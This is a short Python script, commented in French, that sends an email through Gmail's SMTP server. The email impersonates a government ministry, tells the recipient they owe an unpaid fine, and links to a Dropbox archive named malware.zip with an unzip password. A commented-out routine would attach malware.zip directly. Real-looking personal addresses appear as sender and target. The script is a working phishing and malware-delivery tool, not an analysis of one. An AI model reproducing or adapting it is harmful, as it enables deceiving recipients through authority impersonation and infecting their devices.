import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# Paramètres de connexion Gmail
smtp_server = "smtp.gmail.com"
smtp_port = 587 
username = "ismael.dubuc@gmail.com" 
password = ""

# Créer l'objet du message
msg = MIMEMultipart()
msg['From'] = username  
msg['To'] = "yanis.abbar93@gmail.com"  
msg['Subject'] = "ENTAI: VOUS AVEZ UNE AMENDE IMPAYE"

# Ajouter le corps du message
body = "Bonjour,\n\nVeuillez trouver à ce lien https://www.dropbox.com/scl/fi/gfwd454lfa7fd1wfs611v/malware.zip?rlkey=6juxq6rpnip3xkqcruwqqszdr&st=il7cn37v&dl=0 le fichier contenant la vidéo de votre infraction. Pour dezipper le fichier veuillez utiliser le code suivant : 1234 \n Cordialement Le Ministère."
msg.attach(MIMEText(body, 'plain'))

# Fonction pour attacher un fichier
# def ajouter_piece_jointe(nom_fichier):
#     try:
#         with open(nom_fichier, "rb") as attachment:
#             part = MIMEBase('application', 'octet-stream')
#             part.set_payload(attachment.read())
#             encoders.encode_base64(part)
#             part.add_header(
#                 'Content-Disposition',
#                 f'attachment; filename={nom_fichier}',
#             )
#             msg.attach(part)
#     except FileNotFoundError:
#         print(f"Erreur : Le fichier {nom_fichier} est introuvable.")
#     except Exception as e:
#         print(f"Une erreur s'est produite en ajoutant {nom_fichier} : {e}")

# ajouter_piece_jointe("malware.zip")

try:
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(username, password)  
    server.send_message(msg) 
    server.quit()

    print("Email envoyé avec succès")

except Exception as e:
    print(f"Une erreur s'est produite lors de l'envoi de l'email : {e}")
